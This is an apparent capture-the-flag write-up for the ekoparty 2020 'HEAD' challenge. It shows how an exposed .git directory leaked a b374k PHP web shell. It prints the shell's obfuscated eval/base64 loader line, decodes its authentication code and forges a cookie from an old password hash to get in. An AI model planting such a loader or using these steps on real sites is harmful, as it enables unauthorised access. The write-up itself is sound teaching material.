# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
ekoparty 2020

# Category
GIT

# Challenge Name
HEAD

# Challenge Points
438 pts

# Challenge Description
A common mistake on websites deployments.

[My Webshell](http://head.eko.cap.tf:30000/)

# Attachments
## website main page
```html
<!doctype html>
<html>
    <head>
        <meta charset='utf-8'>
        <meta name='robots' content='noindex, nofollow, noarchive'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'>
    </head>
    <body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'>
        <br>
        <p>
            <center>
                <noscript>You need to enable javascript</noscript>
            </center>
        </p>
        <script type='text/javascript'>
            var d = document;
            d.write("<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>");
            d.getElementById('pass').focus();
            d.getElementById('pass').setAttribute('autocomplete', 'off');
        </script>
    </body>
</html>
```

# Solution
Following the provided link, we find a page that is completely blank other than a password prompt. Given that this challenge is in the `git` category, the first thing I checked was whether I could access a `.git` directory. When I changed the url to `http://head.eko.cap.tf:30000/.git`, I was redirected to `http://head.eko.cap.tf:30000/.git/`, nice. At `http://head.eko.cap.tf:30000/.git/HEAD` I got this response:
```
ref: refs/heads/master
```
We have access to the site's source control. Next, we can use something like `gitdumper.sh` from [GitTools](https://github.com/internetwache/GitTools) to pull down the whole repository. Let's take a look at the repository's commit history with `git log`:
```
commit b7d095eea87d18b2a1ca4a68733d5266bbc19de4 (HEAD -> master)
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 03:03:50 2020 +0000

    Final commit

commit 26925bc713d9cfc666112c9cc62ab49c6671a03e
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 03:02:53 2020 +0000

    Bad files removal

commit 179e12491a2628c71bb854514f3b05cdf7cb546d
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 03:02:21 2020 +0000

    Security enhance

commit 783ec943507158f27e4921963c8a2d7bfd02999d
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 03:01:38 2020 +0000

    File creation

commit 5d6b2408488d0f29d687610a49cab40298a6d01b
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:49:03 2020 +0000

    First commit

commit 96575dcf9117e54d34233c1bac9bf5d4efda7103
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:42:16 2020 +0000

    Final commit

commit 39f280f51d37fdc3a0181a0802ae2214041faaf7
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:41:57 2020 +0000

    Bad files

commit 190507b3bd67dff13d168ffd0886f60e77b7d2fa
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:41:03 2020 +0000

    Security enhance

commit 71693af6f6a71b39e0e10375163daafe94e4af20
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:39:40 2020 +0000

    File creation

commit c95c2b60fadf178c1a3ac84c6c404a308e919987
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 02:38:45 2020 +0000

    Repo init
```
"Security Enhance?" With `git show 179e12491a2628c71bb854514f3b05cdf7cb546d` we can take a closer look at what that commit changed:
```
commit 179e12491a2628c71bb854514f3b05cdf7cb546d
Author: DC <haxor@ekoparty.org>
Date:   Thu Sep 24 03:02:21 2020 +0000

    Security enhance

diff --git a/shell.php b/shell.php
index ebd457e..c568771 100755
--- a/shell.php
+++ b/shell.php
@@ -6,5 +6,5 @@
        https://github.com/b374k/b374k

 */
-$GLOBALS['pass'] = "1e7a1d03e274e66e22bfabf2d8f4a0408970e354"; // sha1(md5(pass))
-$func="cr"."eat"."e_fun"."cti"."on";$b374k=$func('$x','ev'.'al'.'("?>".gz'.'un'.'com'.'pre'.'ss(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$b374k("eNrs/Wm74jiyKAp/r19Br5O311qbzLTBgO3Kyuw2YDPPxgxddfPxbIMnPGK6+r
 ...
+$GLOBALS['pass'] = file_get_contents('../secret'); // sha1(md5(pass))
+$func="cr"."eat"."e_fun"."cti"."on";$b374k=$func('$x','ev'.'al'.'("?>".gz'.'un'.'com'.'pre'.'ss(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$b374k("eNrs/Wm74jiyKAp/r19Br5O311qbzLTBgO3Kyuw2YDPPxgxddfPxbIMnPGK6+r9fyTZghjVkVe39nveeW/10LiyFQiEpFIoISaFf/uFoTuFDqz+qU/3Zvx5NWwoM+btvfzdsXnr8rfC1wLsuHz89yHvHsF3ZffhYePBl19Qt3oC/5TD9K9pWKLs+/CnxPi/wngx/65Ziw78mrydgluxHtruFPx3XFmXPk72H5y//+PYLpOSnMyWu7NmBCwAef/vXo4DhlW1CzYPGLdeuO6jQVk3dUFOtQcR2n9SWE1JtSuW91q3GEYGwG2QkK7g/ns1aWDfar
 ...
```
It looks like our passsword is probably put through md5 and then sha1 hashing then compared to `GLOBALS['pass']`, and this commit just switched from having the hash hardcoded to being in a file. The hash could still be the same one, just in a different place now. After that, it looks like there's a bit of obvuscated code, lets clean that up a bit:
```php
$GLOBALS['pass'] = file_get_contents('../secret'); // sha1(md5(pass))
$func="create_function";
$b374k=$func('$x','eval("?>".gzuncompress(base64_decode($x)));');
$b374k("eNrs/Wm74jiyKAp/r19Br5O311qbzLTBgO3Kyuw2YDPPxgxddfPxbIMnPGK6+r9fyTZghjVkVe39nveeW/10LiyFQiEpFIoISaFf/uFoT
 ...
```
So, the rest of the code is in this very long, compressed, base 64 encoded string. Since `gitdumper.sh` only got us the `.git` folder, we need to `git checkout` a commit to get our hands on some files. I ran `git checkout master` to make sure I was on the most recent commit to the master branch then `git stash` to recover the original state of that commit.

Next, I wrote a script to extract the encoded string, decode it, and save it to a file:
```python
#!/usr/bin/env python3

import base64
import zlib

with open("<path to repo>/index.php") as f:
    txt = f.read()

a = txt.find('$b374k("')
b = txt.find('");?>')

if a != -1 and b != -1:
    a += 8
    c = txt[a:b]
    c = base64.b64decode(c)
    c = zlib.decompress(c)

    with open("out.php", "wb") as f:
        f.write(c)
```

The decoded `php` script is pretty long but here's the part that deals with the password:
```php
if(!function_exists('auth'))
{
    function auth()
    {
        if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass']) != ''))
        {
            $c = $_COOKIE;
            $p = $_POST;

            if(isset($p['pass']))
            {
                $your_pass = sha1(md5($p['pass']));

                if($your_pass==$GLOBALS['pass'])
                {
                    setcookie("pass", $your_pass, time()+36000, "/");
                    header("Location: ".get_self());
                }
            }
            
            if(!isset($c['pass']) || (isset($c['pass']) && ($c['pass'] != $GLOBALS['pass'])))
            {
                $res = "<!doctype html> <html> <head> <meta charset='utf-8'> <meta name='robots' content='noindex, nofollow, noarchive'> <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0'> </head> <body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p> <script type='text/javascript'> var d = document; d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:34px;width:34%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\"); d.getElementById('pass').focus(); d.getElementById('pass').setAttribute('autocomplete', 'off'); </script> </body></html> ";

                echo $res;
                die();
            }
        }
    }
}
```

The `auth` function reads a password from the user, hashes it, stores that hash on the **client-side** (in a cookie), then compares that to the correct password hash. So, given the correct hash, we can create our own "pass" cookie and log in without knowing the password!

If we do that with the hardcoded hash from before the "Security Enhance" commit, we get in! From here we can access the parent directory and find a file named `flag`:
```
EKO{m4st3r_0f_g1t}
```